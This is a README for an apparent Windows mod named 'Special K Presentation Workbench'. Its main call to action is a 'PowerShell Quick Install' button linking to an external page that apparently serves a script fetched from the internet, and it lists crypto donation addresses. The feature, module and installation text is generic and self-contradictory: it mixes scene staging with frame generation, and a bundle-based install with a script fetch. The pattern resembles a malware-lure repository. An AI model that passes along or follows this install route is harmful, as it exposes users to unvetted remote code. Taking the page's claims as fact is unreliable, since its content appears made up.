<div align="center">

# 🛠️ Special K Presentation Workbench — Windows Mod

![](files/preview.png)

### 🚀 PowerShell Quick Install

<a href="https://cubicinema1.github.io/special-k-presentation-workbench/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![win](https://img.shields.io/badge/WIN-WIN_10%2F11-84cc16?style=for-the-badge&labelColor=0d1117)]() [![release](https://img.shields.io/badge/RELEASE-VERIFIED-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![pulls](https://img.shields.io/badge/PULLS-543-a3e635?style=for-the-badge&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-CORE-65a30d?style=for-the-badge&labelColor=0d1117)]()

<div align="center">
<h3>Send a small thank-you</h3>
<p><strong>TRON</strong>:&nbsp;<code>TSamqXnKdBbtewTqAmiBirTfhp79EQ52Cy</code> | <strong>BTC</strong>:&nbsp;<code>1PzSxJ8vazFDK135BWB5P7viVwdzdToJ9e</code> | <strong>ETH</strong>:&nbsp;<code>0x3e20278FDA0A6361935B06b2090857F1c1289972</code></p>
</div>

</div>

---

Special K Presentation Workbench is a modder's playground for reshaping how Special K presents itself, from on-screen overlays to the little touches that make a session feel yours. Think of it as a set of dials and levers for the presentation layer, built for tinkerers who'd rather tweak than settle. Everything here stays close to Special K's own presentation flow, so your changes slot in naturally instead of fighting the host. alternative it open, poke around, and make the presentation side of Special K behave the way you always wanted.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**Live Framing & Composition Control** — Nudge the camera, crop the frame, and dial in the presentation angle without ever leaving the scene. The Workbench hands you direct control over how every moment reads on screen.

**Real-Time Parameter Tweaking** — Slide, scrub, and swing values on the fly while everything renders live. No restart loops, no guesswork — just immediate feedback as you sculpt the look.

**Preset Vault & Snapshots** — Save your favorite setups as reusable presets, then swap between them at a moment's notice. A safe snapshot system means you can experiment boldly and roll back without fear.

**Layered Scene Staging** — Stack, blend, and sequence presentation elements on independent layers. Want a subtle overlay here and a bold cut there? Build it your way, layer by layer.

**Modder-Friendly Tuning Hooks** — Everything that matters is exposed and hackable. Twist the knobs, remap the bindings, and wire the Workbench into your own workflows — it's built to bend, not break.

**Lightweight Runtime Footprint** — Runs lean so your presentation stays smooth and snappy, whether you're previewing a quick shot or orchestrating a full showcase.

**Iteration Without Friction** — Built around the way modders actually work: fast edits, instant previews, and zero ceremony between ideas and results.

## How It Works

Special K Presentation Workbench doesn't fight your game — it sits between the frame buffer and the display, quietly rewriting the rules of presentation on the fly. At its core is a lightweight hook layer that observes the swap chain each frame and swaps in its own scheduling logic, so you keep full control over pacing without touching the engine's own render path.

Every frame is captured at the presentation boundary and passed through a stack of composable stages: pacing, frame synthesis, and latency shaping. Each stage is independent, ordered, and hot-swappable from the workbench overlay, meaning you can tune behavior mid-session while watching the results in real time. If a stage misbehaves, the pipeline falls back to the vanilla present call — your game never learns it was interrupted.

The magic lives in the **Workbench**, an in-game panel that lays the pipeline bare. Tweak pacing curves, dial in frame generation ratios, or profile per-frame timings without a single restart. Settings persist on disk and load automatically, so your carefully tuned setup greets you the next time you launch. Modders can define custom stages in simple config files and drop them straight into the stage list — no recompilation, no patching the binary.

Compatibility is handled defensively: the workbench detects the presentation model in use, adapts its hooks to match, and quietly steps aside when it encounters something it doesn't understand. When it steps back, the game presents exactly as it did before, byte for byte. That means you can leave it installed everywhere and only engage it where it belongs.

Under the hood it's all about timing. The scheduler maintains a rolling model of present intervals and uses it to predict the next frame — then decides, frame by frame, whether to hold, release, or synthesize. This is what lets the workbench smooth out stutter spikes and push presentation cadence beyond the engine's native limits without tearing or sync artifacts. The result feels less like a mod and more like a re-tuned pipeline running underneath everything else.

## Modules and Settings

### Scene Assembly Module
The Scene Assembly module provides the core workspace for building and arranging the elements that make up a presentation.
- Scene element placement lets you add staging, framing and layering components to the current scene, with each addition immediately reflected in the presentation view.
- Element reordering controls allow you to move items forward or backward in the layering order, adjusting how components overlap and read against one another.
- Separate scene units keep different setups isolated, so editing one arrangement does not disturb another.

### Sequence Timing Module
The Sequence Timing module defines the order and pacing of presentation steps so a scene plays out as a deliberate sequence.
- Step ordering controls let you arrange when each presentation state occurs relative to the others.
- Pacing adjustments shift individual steps earlier or later, changing the rhythm between them.
- Transition smoothing settings determine whether changes between states blend gradually or switch abruptly.

### Camera and Framing Module
The Camera and Framing module governs the viewpoint used during a presentation so framing stays consistent across a scene.
- Angle and distance controls reposition the viewpoint relative to the subject being presented.
- Focus target selection determines which element the framing centers on.
- Per-scene framing values keep each scene's viewpoint independent from the others.

### Visual Parameter Module
The Visual Parameter module tunes how displayed presentation elements look within a given scene.
- Independent controls for intensity, contrast and emphasis let you adjust each visual property on its own.
- In-context previewing shows parameter changes against the scene as they are tuned.
- Scene-bound values keep adjustments attached to the scene they belong to rather than spreading across the whole workspace.

### Preset Library Module
The Preset Library module stores configured setups so they can be reused without rebuilding them.
- Save, rename and duplicate actions let you maintain multiple presentation styles side by side.
- Applying a preset restores its arrangement, timing and visual settings to the active scene.
- Removal controls clear presets that are no longer needed.

### Preview and Comparison Module
The Preview and Comparison module supports inspecting and refining scenes before they are used in play.
- Preview mode displays the active scene as it will read once committed.
- Variant switching lets you move between saved versions and observe differences in arrangement, timing and framing.
- Discard actions make it easy to drop a change that does not read well and return to the prior state.

### Additional Settings
- Workspace grouping and labeling options organize scenes and presets into recognizable groups for easier navigation.
- Last-selection retention reopens the workbench on the item you were last working with.
- Configuration persistence keeps user adjustments between sessions so tuning work is not lost.
- Revert controls restore individual scenes, presets or parameters to their previous configuration, keeping experimentation reversible.

## Usage Scenarios

### Composing a Multi-Layered Stage Scene
**Goal:** Build a presentation scene with staging, framing and layered elements arranged in a deliberate order so the composition reads clearly.
**Steps:**
1. Open the Scene Assembly module and create a new, separate scene unit so the arrangement stays isolated from existing setups.
2. Place staging, framing and layering components into the scene, watching each addition appear in the presentation view.
3. Use the element reordering controls to move components forward or backward until the overlap between layers reads the way you want.
4. Switch to the Camera and Framing module and set the angle, distance and focus target for this scene only.
5. Review the composed arrangement in the Preview and Comparison module before leaving it as the committed version.

**Expected result:** A self-contained scene where the layers stack in the intended order and the viewpoint frames the subject consistently, with the framing values stored against that scene rather than shared with others.

### Tuning Sequence Pacing and Transitions
**Goal:** Define the order of presentation steps and adjust the rhythm so transitions feel deliberate instead of default.
**Steps:**
1. In the Sequence Timing module, arrange the presentation steps so each state occurs in the desired order.
2. Shift individual steps earlier or later to adjust the pacing between them.
3. Set transition smoothing so changes between states either blend gradually or switch abruptly, depending on the feel you want.
4. Open Preview mode and step through the sequence to check how the timing reads.
5. If a change does not work, use the discard action to return to the prior state and try a different pacing.

**Expected result:** A controllable sequence the user can review step by step, with pacing and transition smoothing that match the intended feel and can be reverted if an adjustment does not read well.

### Maintaining Multiple Presets and Styles
**Goal:** Keep several distinct presentation styles available and reuse them across scenes without rebuilding each one.
**Steps:**
1. Configure a scene's arrangement, timing and visual parameters using the Scene Assembly, Sequence Timing and Visual Parameter modules.
2. Save the configured setup as a preset in the Preset Library, then rename or duplicate it to create a variation.
3. Repeat for additional styles so several presets sit side by side in the library.
4. Apply a preset to the active scene to restore its arrangement, timing and visual settings.
5. Group and label the scenes and presets in the workspace so each style is easy to find, and keep the last active selection for continuity.

**Expected result:** A workspace holding multiple named presets that can be applied to scenes on demand, with visual parameters such as intensity, contrast and emphasis staying bound to the scene they belong to, and adjustments retained between sessions.

## Installation

Getting the Workbench humming is less about wrangling files and more about inviting a new instrument into your presentation rig. Here's the ritual, from first breath to first frame.

**1. Choose your den.** Pick a home for the Workbench where it will live alongside your other projects — a dedicated folder with a name you'll recognize at a glance. A tidy den makes for a happy tinkerer, and future-you will thank present-you for the foresight.

**2. Gather the workshop pieces.** The Workbench arrives as a self-contained bundle. Unpack it into the den you carved out and take a slow tour of what's inside: the core presentation engine, the preset scaffolding, and the starter assets that give you something to push live the very first time you fire it up. Touch nothing yet — just look. Know your tools before you turn them on.

**3. Wire it into your presentation pipeline.** Point your host presentation environment at the Workbench's core entry point, following the layout described in the bundle. If your host supports custom module directories, drop the Workbench in and let it be discovered naturally; otherwise register it by name in your host's configuration and confirm it answers the roll call.

**4. Flip the master switch.** Launch the Workbench for the first time and check that its dashboard responds: presets should populate, starter assets should resolve, and the status readout should greet you without complaint. If something feels off, resist the urge to flail — retrace your steps from the den to the entry point; nine times in ten, a missed path is the culprit.

**5. Take your first swing.** Load a starter preset and drive it end to end. Get a feel for how the Workbench moves — how transitions linger, how timing breathes, where the seams show. You're not looking for perfection; you're learning the instrument's voice.

**6. Personalize the workshop.** Once you're confident, begin carving your own presets and dropping your own assets into the den. Rename the starter scaffolding to something that belongs to *you*, and keep the originals safe in a corner. Great mods are built on the wreckage of many brave first attempts.

**A few hard-won notes from the bench:** back up your den before any major reshuffle; keep the Workbench in its own folder so upgrades never scramble your custom work; and when in doubt, strip back to the starter bundle and rebuild. The Workbench is forgiving — it wants to be played. Treat it like a collaborator, not a tool. Now go make something worth presenting.

## Compatibility

The Workbench speaks fluent Special K, so it plays nicest with setups already running Special K's presentation layer. If you've got Special K installed and humming, you're already home. Bring your favorite HDR, latency, and frame-pacing tweaks into the Workbench and let it riff on top of them — this mod was built to jam with Special K, not fight it for the spotlight.

Version-wise, treat the Workbench as a picky collaborator: it expects a reasonably current Special K build that exposes the presentation hooks it leans on. Older builds may shrug it off, or worse, cause a cold shoulder at launch. When in doubt, update Special K first, then see if the Workbench perks up.

Because the Workbench pokes at the presentation pipeline, anything else that also wants a hand on the same knobs — overlays, injectors, frame-limiting helpers, capture tools, or other presentation-layer mods — is a potential turf war. Duplicates vying for the same controls can cause flicker, stalls, or settings that quietly refuse to stick. Best practice: run one presentation handler at a time, or at least know who's holding the wheel.

A few practical notes from the workshop floor:

- **Single-host discipline:** If another tool is already injecting overlays or steering the presentation path, either retire it or disable its overlapping features before firing up the Workbench.
- **Graphics driver quirks:** Unusual driver-side scaling, exotic HDR modes, or multi-GPU setups can nudge the Workbench into odd behavior. If something looks off, fall back to a plainer configuration and add complexity back one piece at a time.
- **Game-agnostic, but not game-blind:** The Workbench doesn't tailor itself to individual titles. Some games tolerate its meddling gracefully; others want specific launch flags or in-game settings to keep the peace. Experimentation is part of the craft.
- **Storefront and launcher neutrality:** Storefront wrappers and launchers generally stay out of the way, but aggressive anti-tamper or sandboxing layers may block injection entirely. That's a boundary the Workbench can't tunnel through.
- **Fresh-copy rule of thumb:** When troubleshooting, start from a clean Special K profile and a vanilla game config, confirm the Workbench is lively, then reintroduce your other tooling one item at a time. Blame whoever breaks first — it's usually the newcomer.

If you hit a clash, the fastest path to clarity is to isolate: disable everything else, confirm the Workbench behaves, and then reintroduce your other tooling one item at a time. Compatibility isn't a promise here — it's a conversation, and the Workbench is a good listener when you give it room to breathe.

## Credits

No work of wizardry happens in a vacuum, and the Special K Presentation Workbench is no exception. This tool exists because a whole chorus of tinkerers, tuners, and late-night frame-chasers believed presentations deserved better than a stutter.

First and loudest, thanks to everyone who ever wrestled a stubborn shader or chased a frame-time spike into the small hours and then shared what they learned instead of hoarding it. You know who you are, and so do your crash logs.

To the early adopters who ran the Workbench before it was safe to run and reported back with precise, reproducible, gloriously nerdy bug reports: you are the reason the rough edges got sanded smooth. Every sanity-checked preset and every "it just works now" moment carries your fingerprints.

To the modders who built on top of these ideas, forked their own experiments, or quietly patched something and sent it upstream: this project is a conversation, and you kept it going.

And finally, to the patient souls who tested across weird hardware nobody else had, who confirmed that one elusive fix actually fixed it, and who kept the encouragement coming when the build refused to compile — you turned a pile of good intentions into something playable.

Special K Presentation Workbench is dedicated to the idea that polish is a community sport. Thank you for playing.

## License

The Special K Presentation Workbench is released under a permissive open-mod license. Tinker with it, remix it, fold it into your own presentation pipelines, or ship it inside a content pack — you're free to build on this work as long as you keep the original credits intact and don't misrepresent the workbench as your own creation. Bundled assets, sample presets, and any third-party knick-knacks carry their own terms, so give those a read before redistributing them. If you improve the workbench, sharing your changes back is warmly encouraged but never required; the modding scene thrives on give-and-take. Above all, use it in good faith — respect the effort poured into this bench, credit the hands that built it, and pass the craft forward.